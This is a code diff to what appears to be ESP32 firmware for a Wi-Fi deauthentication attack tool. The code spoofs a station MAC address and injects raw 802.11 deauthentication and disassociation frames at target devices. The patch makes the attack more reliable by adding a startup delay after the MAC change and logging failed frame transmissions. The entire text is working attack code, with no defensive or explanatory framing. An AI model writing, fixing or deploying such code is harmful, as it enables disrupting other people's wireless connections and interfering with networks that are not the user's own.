@@ -46,6 +46,9 @@ static inline esp_err_t wifi_spoof_sta_mac(const uint8_t mac[6])
     esp_wifi_stop();
     esp_err_t rc = esp_wifi_set_mac(WIFI_IF_STA, mac);
     esp_wifi_start();
+    /* WiFi needs a few hundred ms to fully bring STA back up after
+     * start. TX requests before that return ESP_ERR_WIFI_IF silently. */
+    delay(250);
     return rc;
 }
 
@@ -88,7 +91,15 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
     f[25] = 0x00;
 
     int ok = 0;
-    if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false) == ESP_OK) ok++;
+    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+    if (rc == ESP_OK) ok++;
+    else {
+        static uint32_t _last_tx_err_log = 0;
+        if (millis() - _last_tx_err_log > 1000) {
+            Serial.printf("[80211_tx] deauth rc=%d (0x%x)\n", (int)rc, (unsigned)rc);
+            _last_tx_err_log = millis();
+        }
+    }
 
     /* Same frame, different subtype + reason = disassoc pair. */
     f[0] = 0xA0;  /* subtype=disassoc */
@@ -96,7 +107,8 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
     f[24] = 0x08;  /* reason 8: disassociated due to inactivity */
     f[25] = 0x00;
 
-    if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false) == ESP_OK) ok++;
+    rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+    if (rc == ESP_OK) ok++;
     return ok;
 }
 
